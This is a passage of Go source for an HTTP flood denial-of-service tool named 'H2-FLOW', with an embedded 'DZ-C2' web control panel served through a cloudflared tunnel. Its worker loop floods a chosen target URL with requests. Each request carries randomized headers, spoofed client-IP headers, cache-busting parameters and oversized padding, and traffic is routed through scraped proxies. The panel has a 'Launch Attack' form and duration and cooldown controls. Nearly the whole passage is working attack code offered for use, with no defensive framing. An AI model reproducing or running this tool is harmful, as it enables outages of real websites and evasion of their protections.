	printInfo("Worker", fmt.Sprintf("%d                       ", Speed), "True")
	printInfo("HTTP  ", fmt.Sprintf("%-24s   ", HVERSI), "True")
	if cookie != "" {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			"\033[32m", "\033[0m",
			"\033[37m", "\033[0m",
			"\033[31m", "\033[0m",
			"\033[31m", "\033[32m", "True", "\033[31m")
	} else {
		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
			"\033[32m", "\033[0m",
			"\033[37m", "\033[0m",
			"\033[31m", "\033[0m",
			"\033[37m", "\033[32m", "None", "\033[37m")
	}
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", "\033[31m", "\033[0m")

	Start_Main := time.Now()
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				fmt.Printf("\r%*s\r", 80, "")
				return
			case <-ticker.C:
				elapsed := int(time.Since(Start_Main).Seconds())
				remaining := dur - elapsed
				if remaining < 0 {
					remaining = 0
				}
				fmt.Printf("\r%s〇%s %sTime  %s %s:%s %s%02d/%ds%s                    %s[%s%s%s]\033[K",
					"\033[32m", "\033[0m",
					"\033[37m", "\033[0m",
					"\033[31m", "\033[0m",
					"\033[37m", elapsed, dur, "\033[0m",
					"\033[31m", "\033[32m", "True", "\033[31m")
			}
		}
	}()
	var wg2 sync.WaitGroup
	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() {
			cancel()
		})
	}

	for i := 0; i < Speed; i++ {
		wg2.Add(1)
		c := wcs[i%len(wcs)]
		go func(cli CLI, workerID int) {
			defer wg2.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
			for ctx.Err() == nil {
				method := VMET[rng.Intn(len(VMET))]
				ua := VUAS[rng.Intn(len(VUAS))]
				ref := VREF[rng.Intn(len(VREF))]
				enc := VENC[rng.Intn(len(VENC))]
				cacheCtrl := VCAC[rng.Intn(len(VCAC))]
				FORIP := ipPool[rng.Intn(len(ipPool))]
				realIP := cli.ip
				if realIP == "" {
					realIP = FORIP
				}
				SLOR := VORI[rng.Intn(len(VORI))]
				OPRF := GPFO(SLOR, host)
				prof := PFS[rng.Intn(len(PFS))]
				params := []string{}
				for j := 0; j < 2+rng.Intn(2); j++ {
					key := CBP[rng.Intn(len(CBP))]
					val := strconv.FormatInt(rng.Int63(), 10)
					params = append(params, key+"="+val)
				}
				var targetURL string
				if strings.Contains(tgt, "?") {
					targetURL = tgt + "&" + strings.Join(params, "&")
				} else {
					targetURL = tgt + "?" + strings.Join(params, "&")
				}
				if MaxP > 0 && rng.Intn(3) == 0 {
					size := MaxP/2 + rng.Intn(MaxP/2)
					if size < 1 {
						size = 64
					}
					targetURL += "&big=" + strings.Repeat("x", size)
				}
				if rng.Intn(10) == 0 {
					targetURL += "&" + RST(rng, 8) + "=" + RST(rng, 12)
				}
				var body io.Reader
				if method == "POST" {
					body = strings.NewReader("")
				} else {
					body = nil
				}
				req, _ := http.NewRequest(method, targetURL, body)
				headers := []headerItem{}
				if method == "POST" {
					headers = append(headers, headerItem{"Content-Type", "application/x-www-form-urlencoded"})
				}
				headers = append(headers, headerItem{"User-Agent", ua})
				headers = append(headers, headerItem{"Accept-Encoding", enc})
				headers = append(headers, headerItem{"Cache-Control", cacheCtrl})
				if OPRF.Origin != "" && OPRF.Referer != "" {
					headers = append(headers, headerItem{"Referer", OPRF.Referer})
				} else if ref != "" {
					headers = append(headers, headerItem{"Referer", ref})
				}
				if OPRF.Origin != "" {
					headers = append(headers, headerItem{"Origin", OPRF.Origin})
				}
				headers = append(headers, headerItem{"Sec-Fetch-Site", OPRF.SecFetchSite})
				headers = append(headers, headerItem{"Accept", prof.Accept})
				headers = append(headers, headerItem{"Accept-Language", prof.Lang})
				headers = append(headers, headerItem{"Connection", "keep-alive"})
				headers = append(headers, headerItem{"Pragma", "no-cache"})
				headers = append(headers, headerItem{"Upgrade-Insecure-Requests", "1"})
				headers = append(headers, headerItem{"If-Modified-Since", ifModifiedSince})
				headers = append(headers, headerItem{"X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16)})
				if prof.SecChUa != "" {
					headers = append(headers, headerItem{"Sec-Ch-Ua", prof.SecChUa})
					headers = append(headers, headerItem{"Sec-Ch-Ua-Mobile", prof.SecChUaMov})
					headers = append(headers, headerItem{"Sec-Ch-Ua-Platform", prof.SecChUaPlat})
				}
				headers = append(headers, headerItem{"Sec-Fetch-Mode", prof.SecFetchMode})
				headers = append(headers, headerItem{"Sec-Fetch-Dest", prof.SecFetchDest})
				if prof.DNT != "" {
					headers = append(headers, headerItem{"DNT", prof.DNT})
				}
				if rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"TE", "trailers"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"A-IM", "Feed"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Delta-Base", "12340001"})
				}
				if rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"dnt", "1"})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Access-Control-Request-Method", "GET"})
				}
				if rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"source-ip", RST(rng, 5)})
				}
				if rng.Intn(4) == 0 {
					headers = append(headers, headerItem{"Data-Return", "false"})
				}
				if Supported["X-Original-URL"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Original-URL", "/" + strconv.FormatInt(rng.Int63(), 16)})
				}
				if Supported["X-Forwarded-Host"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Forwarded-Host", strconv.FormatInt(rng.Int63(), 16) + "t.me/ytdizflyze"})
				}
				if Supported["X-Request-ID"] && rng.Intn(3) == 0 {
					headers = append(headers, headerItem{"X-Request-ID", strconv.FormatInt(rng.Int63(), 16)})
				}
				if Supported["CF-Connecting-IP"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"CF-Connecting-IP", realIP})
				}
				if Supported["True-Client-IP"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"True-Client-IP", realIP})
				}
				if Supported["CDN-Loop"] && rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"CDN-Loop", "cloudflare"})
				}
				if rng.Intn(5) == 0 {
					headers = append(headers, headerItem{"X-Real-IP", realIP})
				}
				if MaxHead > 0 && rng.Intn(2) == 0 {
					size := MaxHead/2 + rng.Intn(MaxHead/2)
					if size < 1 {
						size = 512
					}
					headers = append(headers, headerItem{"X-Large-Data", strings.Repeat("x", size)})
				}
				var cookies []string
				if cookie != "" {
					cookies = append(cookies, cookie)
				}
				for _, name := range COOKIES {
					if rng.Intn(2) == 0 {
						cookies = append(cookies, name+"="+strconv.FormatInt(rng.Int63(), 16))
					}
				}
				if len(cookies) > 0 {
					headers = append(headers, headerItem{"Cookie", strings.Join(cookies, "; ")})
				}
				headers = append(headers, headerItem{"X-Forwarded-For", realIP})
				headers = append(headers, headerItem{"X-Real-IP", realIP})
				headers = append(headers, headerItem{"Range", "bytes=0-"})
				headers = append(headers, headerItem{"If-None-Match", `"` + RST(rng, 16) + `"`})
				headers = append(headers, headerItem{"Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"})
				headers = append(headers, headerItem{"Accept-Language", "en-US,en;q=0.9,id;q=0.8"})
				headers = append(headers, headerItem{"X-Forwarded-For", realIP + ", " + RIP(rng)})
				headers = append(headers, headerItem{"X-Originating-IP", realIP})
				headers = append(headers, headerItem{"X-Remote-IP", realIP})
				headers = append(headers, headerItem{"X-Remote-Addr", realIP})
				headers = append(headers, headerItem{"X-Client-IP", realIP})

				rng.Shuffle(len(headers), func(i, j int) {
					headers[i], headers[j] = headers[j], headers[i]
				})
				req.Header = make(http.Header)
				for _, h := range headers {
					req.Header.Set(h.key, h.value)
				}
				resp, err := cli.client.Do(req)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
			}
		}(c, i)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg2.Wait()
	fmt.Println()
}

const webHTML = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DZ-C2 [ t.me/ytdizflyze ]</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0b0b0b; color:#e0e0e0; font-family:'Segoe UI',system-ui,sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
        .dashboard { max-width:900px; width:100%; }
        .header { display:flex; align-items:baseline; justify-content:space-between; border-bottom:1px solid #2a2a2a; padding-bottom:12px; margin-bottom:28px; }
        .header h1 { font-weight:300; font-size:1.8rem; letter-spacing:1px; color:#f0f0f0; }
        .header h1 span { color:#e74c3c; font-weight:400; }
        .header .status { font-size:0.8rem; color:#7c7c7c; }
        .header .status .dot { display:inline-block; width:8px; height:8px; border-radius:50%; margin-right:6px; }
        .dot.ready { background:#2ecc71; }
        .dot.busy { background:#e74c3c; animation:pulse 1s infinite; }
        .dot.cooldown { background:#f39c12; animation:pulse 1s infinite; }
        @keyframes pulse { 0%{opacity:1;} 50%{opacity:0.4;} 100%{opacity:1;} }
        .info-grid { display:grid; grid-template-columns:1fr 1fr; gap:6px 30px; margin-bottom:30px; font-size:0.9rem; }
        .info-grid .item { display:flex; justify-content:space-between; padding:6px 0; border-bottom:1px solid #1e1e1e; word-break:break-all; }
        .info-grid .item .label { color:#7c7c7c; flex-shrink:0; margin-right:10px; }
        .info-grid .item .value { color:#e0e0e0; font-weight:400; text-align:right; }
        .section-title { font-size:0.75rem; text-transform:uppercase; letter-spacing:1.5px; color:#5c5c5c; margin:28px 0 14px 0; border-bottom:1px solid #1a1a1a; padding-bottom:6px; }
        .form-group { margin-bottom:16px; }
        .form-group label { display:block; font-size:0.8rem; color:#b0b0b0; margin-bottom:4px; letter-spacing:0.3px; }
        .form-group input, .form-group textarea { width:100%; padding:10px 12px; background:#161616; border:1px solid #2a2a2a; border-radius:4px; color:#f0f0f0; font-size:0.95rem; transition:border 0.2s; outline:none; }
        .form-group input:focus, .form-group textarea:focus { border-color:#e74c3c; }
        .form-row { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
        .btn { display:inline-block; width:100%; padding:12px; background:#e74c3c; border:none; border-radius:4px; color:#fff; font-weight:500; font-size:1rem; letter-spacing:1px; cursor:pointer; transition:background 0.2s; margin-top:8px; }
        .btn:hover { background:#c0392b; }
        .btn:disabled { opacity:0.5; cursor:not-allowed; background:#555; }
        .proxy-actions { display:grid; grid-template-columns:1fr 1fr 1fr 1fr; gap:16px; margin:20px 0; }
        .proxy-actions .btn { background:#2c3e50; }
        .proxy-actions .btn:hover { background:#1a252f; }
        .proxy-actions .btn.stop { background:#e74c3c; }
        .proxy-actions .btn.stop:hover { background:#c0392b; }
        .log-area { margin-top:30px; border-top:1px solid #1e1e1e; padding-top:16px; }
        .log-area .log-header { display:flex; justify-content:space-between; font-size:0.7rem; color:#5c5c5c; margin-bottom:6px; }
        .log-area .log-content { background:#0f0f0f; padding:12px 14px; border-radius:4px; font-family:'Fira Code',monospace; font-size:0.8rem; color:#a0a0a0; max-height:160px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; border-left:2px solid #2a2a2a; }
        .log-area .log-content .attack-started { color:#2ecc71; }
        .log-area .log-content .error { color:#e74c3c; }
        .log-area .log-content .info { color:#3498db; }
        .footer { margin-top:30px; font-size:0.7rem; color:#3a3a3a; text-align:center; border-top:1px solid #1a1a1a; padding-top:16px; }
        .log-content::-webkit-scrollbar { width:4px; }
        .log-content::-webkit-scrollbar-track { background:#0f0f0f; }
        .log-content::-webkit-scrollbar-thumb { background:#2a2a2a; border-radius:4px; }
        @media (max-width:600px) {
            .header { flex-direction:column; align-items:flex-start; gap:6px; }
            .info-grid { grid-template-columns:1fr; gap:4px; }
            .form-row { grid-template-columns:1fr; gap:0; }
            .proxy-actions { grid-template-columns:1fr 1fr; gap:10px; }
        }
    </style>
</head>
<body>
<div class="dashboard">
    <div class="header">
        <h1>H2-<span>FLOW</span></h1>
        <div class="status"><span class="dot ready" id="statusDot"></span> <span id="statusText">ready</span></div>
    </div>

    <div class="info-grid">
        <div class="item"><span class="label">target</span><span class="value" id="info-target">—</span></div>
        <div class="item"><span class="label">duration</span><span class="value" id="info-duration">—</span></div>
        <div class="item"><span class="label">cookie</span><span class="value" id="info-cookie">—</span></div>
        <div class="item"><span class="label">status</span><span class="value" id="info-status">—</span></div>
        <div class="item"><span class="label">proxy count</span><span class="value" id="proxy-count">0</span></div>
        <div class="item"><span class="label">proxy status</span><span class="value" id="proxy-status">—</span></div>
    </div>

    <div class="section-title">New attack</div>
    <form id="attack-form" action="/start" method="post">
        <div class="form-group">
            <label for="target">Target Url</label>
            <input type="text" id="target" name="target" placeholder="https://t.me/ytdizflyze" required>
        </div>
        <div class="form-row">
            <div class="form-group">
                <label for="duration">Duration (max 60s)</label>
                <input type="number" id="duration" name="duration" value="60" min="1" max="60" required>
            </div>
            <div class="form-group">
                <label for="cookie">Cookie (Optional)</label>
                <input type="text" id="cookie" name="cookie" placeholder="cf_clearance=...">
            </div>
        </div>
        <button type="submit" class="btn" id="launchBtn">Launch Attack</button>
    </form>

    <div class="section-title">Proxy Control</div>
    <div class="proxy-actions">
        <button class="btn" id="addProxyBtn">Add Proxy</button>
        <button class="btn" id="scanProxyBtn">Scan Proxy</button>
        <button class="btn" id="stopScanBtn" style="display:none;" class="stop">Stop</button>
        <button class="btn" id="scrapeProxyBtn">Scrape Proxy</button>
        <button class="btn" id="stopScrapeBtn" style="display:none;" class="stop">Stop</button>
    </div>

    <div id="addProxyForm" style="display:none; background:#1a1a2e; padding:20px; border-radius:8px; margin-bottom:20px;">
        <h3 style="color:#e74c3c;">Add Proxy</h3>
        <div class="form-group">
            <label>Upload file proxy.txt</label>
            <input type="file" id="proxyFile" accept=".txt">
        </div>
        <div class="form-group">
            <label>Paste Proxy</label>
            <textarea id="proxyText" rows="5" style="width:100%; background:#161616; border:1px solid #2a2a2a; border-radius:4px; color:#e0e0e0; padding:10px;"></textarea>
        </div>
        <button class="btn" id="submitProxyBtn" style="background:#2ecc71;">Add</button>
        <button class="btn" id="cancelProxyBtn" style="background:#555;">Cancel</button>
    </div>

    <div class="log-area">
        <div class="log-header"><span>activity log</span><span id="log-count">0 events</span></div>
        <div class="log-content" id="log-content">[system] Ready</div>
    </div>

    <div class="footer">YT : DIZFLYZE</div>
</div>

<script>
    const statusDot = document.getElementById('statusDot');
    const statusText = document.getElementById('statusText');
    const infoStatus = document.getElementById('info-status');
    const launchBtn = document.getElementById('launchBtn');
    const proxyCountEl = document.getElementById('proxy-count');
    const proxyStatusEl = document.getElementById('proxy-status');
    const log = document.getElementById('log-content');
    const stopScanBtn = document.getElementById('stopScanBtn');
    const stopScrapeBtn = document.getElementById('stopScrapeBtn');

    function updateUI(state, cooldown, proxyStatus) {
        if (state === 'attacking') {
            statusDot.className = 'dot busy';
            statusText.textContent = 'attacking';
            infoStatus.textContent = 'attacking';
            launchBtn.disabled = true;
            launchBtn.textContent = 'Waiting...';
        } else if (state === 'cooldown') {
            statusDot.className = 'dot cooldown';
            statusText.textContent = 'cooldown ' + cooldown + 's';
            infoStatus.textContent = 'cooldown (' + cooldown + 's)';
            launchBtn.disabled = true;
            launchBtn.textContent = 'Cooldown ' + cooldown + 's';
        } else {
            statusDot.className = 'dot ready';
            statusText.textContent = 'ready';
            infoStatus.textContent = 'idle';
            launchBtn.disabled = false;
            launchBtn.textContent = 'Launch Attack';
        }

        // Proxy status and buttons
        proxyStatusEl.textContent = proxyStatus || 'idle';
        if (proxyStatus === 'scanning') {
            stopScanBtn.style.display = 'inline-block';
            document.getElementById('scanProxyBtn').style.display = 'none';
        } else {
            stopScanBtn.style.display = 'none';
            document.getElementById('scanProxyBtn').style.display = 'inline-block';
        }
        if (proxyStatus === 'scraping') {
            stopScrapeBtn.style.display = 'inline-block';
            document.getElementById('scrapeProxyBtn').style.display = 'none';
        } else {
            stopScrapeBtn.style.display = 'none';
            document.getElementById('scrapeProxyBtn').style.display = 'inline-block';
        }
    }

    function fetchStatus() {
        fetch('/status')
            .then(res => res.json())
            .then(data => {
                updateUI(data.state, data.cooldown || 0, data.proxyStatus);
                proxyCountEl.textContent = data.proxyCount || 0;
            })
            .catch(() => {});
    }
    fetchStatus();
    setInterval(fetchStatus, 2000);

    function logMsg(msg, cls='') {
        const time = new Date().toLocaleTimeString();
        const entry = '[' + time + '] ' + msg;
        const el = document.createElement('div');
        el.className = cls;
        el.textContent = entry;
        log.prepend(el);
        while (log.children.length > 20) log.removeChild(log.lastChild);
        document.getElementById('log-count').textContent = log.children.length + ' events';
    }

    document.getElementById('attack-form').addEventListener('submit', function(e) {
        e.preventDefault();
        const form = this;
        const formData = new FormData(form);
        const target = formData.get('target');
        const duration = formData.get('duration');
        const cookie = formData.get('cookie') || '—';

        document.getElementById('info-target').textContent = target;
        document.getElementById('info-duration').textContent = duration + 's';
        document.getElementById('info-cookie').textContent = cookie;
        logMsg('attack started on ' + target + ' (' + duration + 's)', 'attack-started');

        fetch('/start', {
            method: 'POST',
            body: formData
        }).then(res => {
            if (!res.ok) return res.text().then(t => { throw new Error(t) });
            return res.text();
        }).then(text => {
            logMsg(text, 'info');
        }).catch(err => {
            logMsg('error: ' + err.message, 'error');
            fetchStatus();
        });
    });

    document.getElementById('addProxyBtn').addEventListener('click', function() {
        const form = document.getElementById('addProxyForm');
        form.style.display = form.style.display === 'none' ? 'block' : 'none';
    });
    document.getElementById('cancelProxyBtn').addEventListener('click', function() {
        document.getElementById('addProxyForm').style.display = 'none';
    });

    document.getElementById('submitProxyBtn').addEventListener('click', function() {
        const fileInput = document.getElementById('proxyFile');
        const textarea = document.getElementById('proxyText');
        const formData = new FormData();
        if (fileInput.files.length > 0) {
            formData.append('proxyfile', fileInput.files[0]);
        } else if (textarea.value.trim() !== '') {
            formData.append('proxy', textarea.value);
        } else {
            logMsg('Please provide proxies', 'error');
            return;
        }
        logMsg('Menambahkan Proxy...', 'info');
        fetch('/addproxy', {
            method: 'POST',
            body: formData
        }).then(res => res.text())
          .then(text => {
              logMsg(text, 'info');
              document.getElementById('addProxyForm').style.display = 'none';
              fileInput.value = '';
              textarea.value = '';
              fetchStatus();
          })
          .catch(err => logMsg('error: ' + err.message, 'error'));
    });

    document.getElementById('scanProxyBtn').addEventListener('click', function() {
        logMsg('Melakukan Scan...', 'info');
        fetch('/scanproxy', { method: 'POST' })
            .then(res => res.text())
            .then(text => { logMsg(text, 'info'); fetchStatus(); })
            .catch(err => logMsg('error: ' + err.message, 'error'));
    });

    document.getElementById('stopScanBtn').addEventListener('click', function() {
        fetch('/stopscan', { method: 'POST' })
            .then(res => res.text())
            .then(text => { logMsg(text, 'info'); fetchStatus(); })
            .catch(err => logMsg('error: ' + err.message, 'error'));
    });

    document.getElementById('scrapeProxyBtn').addEventListener('click', function() {
        logMsg('Scrape proxies...', 'info');
        fetch('/scrapeproxy', { method: 'POST' })
            .then(res => res.text())
            .then(text => { logMsg(text, 'info'); fetchStatus(); })
            .catch(err => logMsg('error: ' + err.message, 'error'));
    });

    document.getElementById('stopScrapeBtn').addEventListener('click', function() {
        fetch('/stopscrape', { method: 'POST' })
            .then(res => res.text())
            .then(text => { logMsg(text, 'info'); fetchStatus(); })
            .catch(err => logMsg('error: ' + err.message, 'error'));
    });
</script>
</body>
</html>`

func startWebAndTunnel() {
	listener, err := net.Listen("tcp", ":0")
	if err != nil {
		fmt.Println("Gagal mendapatkan port:", err)
		os.Exit(1)
	}
	port := listener.Addr().(*net.TCPAddr).Port

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprint(w, webHTML)
	})

	http.HandleFunc("/status", func(w http.ResponseWriter, r *http.Request) {
		stateMutex.Lock()
		state := attackState
		cooldown := 0
		if state == "cooldown" {
			rem := time.Until(cooldownUntil)
			if rem > 0 {
				cooldown = int(rem.Seconds()) + 1
			} else {
				attackState = "—"
				state = "—"
			}
		}
		stateMutex.Unlock()

		proxyCount := proxyManager.Count()

		scanMutex.Lock()
		scanRunning := scanRunning
		scanMutex.Unlock()
		scrapeMutex.Lock()
		scrapeRunning := scrapeRunning
		scrapeMutex.Unlock()

		proxyStatus := "—"
		if scanRunning {
			proxyStatus = "scanning"
		} else if scrapeRunning {
			proxyStatus = "scraping"
		}

		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"state":"%s","cooldown":%d,"proxyCount":%d,"proxyStatus":"%s"}`, state, cooldown, proxyCount, proxyStatus)
	})

	http.HandleFunc("/start", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		tunnelMutex.Lock()
		if !tunnelReady {
			tunnelMutex.Unlock()
			http.Error(w, "Tunnel not ready", http.StatusServiceUnavailable)
			return
		}
		tHost := tunnelHost
		tunnelMutex.Unlock()

		stateMutex.Lock()
		state := attackState
		if state == "cooldown" {
			rem := time.Until(cooldownUntil)
			if rem > 0 {
				stateMutex.Unlock()
				http.Error(w, fmt.Sprintf("Cooldown %d seconds", int(rem.Seconds())+1), http.StatusTooManyRequests)
				return
			} else {
				attackState = "—"
			}
		}
		if attackState == "attacking" {
			stateMutex.Unlock()
			http.Error(w, "Attack already running", http.StatusConflict)
			return
		}
		attackState = "attacking"
		stateMutex.Unlock()

		target := r.FormValue("target")
		durationStr := r.FormValue("duration")
		inputDur, err := strconv.Atoi(durationStr)
		if err != nil || inputDur <= 0 || inputDur > 60 {
			stateMutex.Lock()
			attackState = "—"
			stateMutex.Unlock()
			http.Error(w, "Durasi Hanya Boleh 1-60s", http.StatusBadRequest)
			return
		}
		if target == "" {
			stateMutex.Lock()
			attackState = "—"
			stateMutex.Unlock()
			http.Error(w, "Target required", http.StatusBadRequest)
			return
		}

		// Self-attack prevention
		if u, err := url.Parse(target); err == nil {
			if u.Hostname() == tHost {
				stateMutex.Lock()
				attackState = "—"
				stateMutex.Unlock()
				http.Error(w, "GOBLOK JANGAN WEB INI JUGA", http.StatusBadRequest)
				return
			}
		}

		realDuration := inputDur * 2
		cookie := r.FormValue("cookie")

		go func() {
			runAttack(target, realDuration, cookie)
			stateMutex.Lock()
			attackState = "cooldown"
			cooldownUntil = time.Now().Add(30 * time.Second)
			stateMutex.Unlock()
		}()

		fmt.Fprintf(w, "Attack started on %s for %d seconds", target, realDuration)
	})

	http.HandleFunc("/addproxy", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var proxies []Proxy

		file, _, err := r.FormFile("proxyfile")
		if err == nil {
			defer file.Close()
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				line := strings.TrimSpace(scanner.Text())
				if line == "" {
					continue
				}
				ip, port := parseLine(line)
				if ip != "" && port != "" {
					proxies = append(proxies, Proxy{ip, port})
				}
			}
		} else {
			proxyText := r.FormValue("proxy")
			lines := strings.Split(proxyText, "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line == "" {
					continue
				}
				ip, port := parseLine(line)
				if ip != "" && port != "" {
					proxies = append(proxies, Proxy{ip, port})
				}
			}
		}

		if len(proxies) == 0 {
			http.Error(w, "No valid proxies found", http.StatusBadRequest)
			return
		}
		added := proxyManager.Add(proxies)
		fmt.Fprintf(w, "Added %d new proxies", added)
	})

	http.HandleFunc("/scanproxy", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		scanMutex.Lock()
		if scanRunning {
			scanMutex.Unlock()
			http.Error(w, "Scan already running", http.StatusConflict)
			return
		}
		// Create cancellable context
		ctx, cancel := context.WithCancel(context.Background())
		scanCtx = ctx
		scanCancel = cancel
		scanRunning = true
		scanMutex.Unlock()

		go func() {
			defer func() {
				scanMutex.Lock()
				scanRunning = false
				scanMutex.Unlock()
			}()
			proxies := proxyManager.GetProxies()
			alive := checkProxies(proxies, scanCtx)
			if scanCtx.Err() != nil {
				return // cancelled
			}
			aliveMap := make(map[string]bool)
			for _, p := range alive {
				aliveMap[p.IP+":"+p.Port] = true
			}
			var dead []string
			for _, p := range proxies {
				if !aliveMap[p.IP+":"+p.Port] {
					dead = append(dead, p.IP+":"+p.Port)
				}
			}
			proxyManager.RemoveDead(dead)
		}()
		fmt.Fprintf(w, "Scan started")
	})

	http.HandleFunc("/stopscan", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		scanMutex.Lock()
		if scanRunning && scanCancel != nil {
			scanCancel()
			scanMutex.Unlock()
			fmt.Fprintf(w, "Scan stopped")
		} else {
			scanMutex.Unlock()
			http.Error(w, "No scan running", http.StatusBadRequest)
		}
	})

	http.HandleFunc("/scrapeproxy", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		scrapeMutex.Lock()
		if scrapeRunning {
			scrapeMutex.Unlock()
			http.Error(w, "Scrape already running", http.StatusConflict)
			return
		}
		ctx, cancel := context.WithCancel(context.Background())
		scrapeCtx = ctx
		scrapeCancel = cancel
		scrapeRunning = true
		scrapeMutex.Unlock()

		go func() {
			defer func() {
				scrapeMutex.Lock()
				scrapeRunning = false
				scrapeMutex.Unlock()
			}()
			scraped := scrapeProxies(scrapeCtx)
			if scrapeCtx.Err() != nil {
				return
			}
			if len(scraped) > 0 {
				proxyManager.Add(scraped)
			}
		}()
		fmt.Fprintf(w, "Scrape started")
	})

	http.HandleFunc("/stopscrape", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		scrapeMutex.Lock()
		if scrapeRunning && scrapeCancel != nil {
			scrapeCancel()
			scrapeMutex.Unlock()
			fmt.Fprintf(w, "Scrape stopped")
		} else {
			scrapeMutex.Unlock()
			http.Error(w, "No scrape running", http.StatusBadRequest)
		}
	})

	server := &http.Server{Addr: fmt.Sprintf(":%d", port)}
	go func() {
		fmt.Printf("Web server running on http://localhost:%d\n", port)
		if err := server.Serve(listener); err != nil && err != http.ErrServerClosed {
			fmt.Println("Server error:", err)
		}
	}()

	cmd := exec.Command("cloudflared", "tunnel", "--url", fmt.Sprintf("http://localhost:%d", port))
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	var wg sync.WaitGroup
	wg.Add(2)

	tunnelURL := ""
	var urlMu sync.Mutex

	scanAndFind := func(rc io.ReadCloser) {
		defer wg.Done()
		scanner := bufio.NewScanner(rc)
		for scanner.Scan() {
			line := scanner.Text()
			if strings.Contains(line, "https://") && strings.Contains(line, ".trycloudflare.com") {
				parts := strings.Fields(line)
				for _, p := range parts {
					if strings.HasPrefix(p, "https://") && strings.Contains(p, ".trycloudflare.com") {
						urlMu.Lock()
						if tunnelURL == "" {
							tunnelURL = p
							if u, err := url.Parse(p); err == nil {
								tunnelMutex.Lock()
								tunnelHost = u.Hostname()
								tunnelReady = true
								tunnelMutex.Unlock()
							}
						}
						urlMu.Unlock()
						return
					}
				}
			}
		}
	}

	go scanAndFind(stdout)
	go scanAndFind(stderr)

	if err := cmd.Start(); err != nil {
		fmt.Println("Gagal menjalankan cloudflared:", err)
		fmt.Println("Pastikan cloudflared sudah terinstall")
		os.Exit(1)
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
	case <-time.After(30 * time.Second):
		fmt.Println("Timeout menunggu tunnel URL.")
	}

	if tunnelURL == "" {
		fmt.Println("Tidak dapat menemukan URL tunnel.")
	} else {
		fmt.Printf("\n🌐 Tunnel URL: %s\n", tunnelURL)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig

	fmt.Println("\nShutting down...")
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	server.Shutdown(ctx)
	cmd.Process.Kill()
}

func main() {
	proxyManager = NewProxyManager("proxy.txt")

	if len(os.Args) == 1 {
		startWebAndTunnel()
		return
	}

	if len(os.Args) < 2 {
		fmt.Println("Cara pakai: H2-FLOW.go <target> <duration> <cookie>")
		os.Exit(1)
	}
	tgt := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			if d > 120 {
				fmt.Println("MAX DURASI 120s")
				dur = 120
			} else {
				dur = d
			}
		}
	}
	cookie := ""
	if len(os.Args) >= 4 {
		cookie = os.Args[3]
	}
	if dur == 0 {
		dur = 120
	}
	runAttack(tgt, dur, cookie)
}
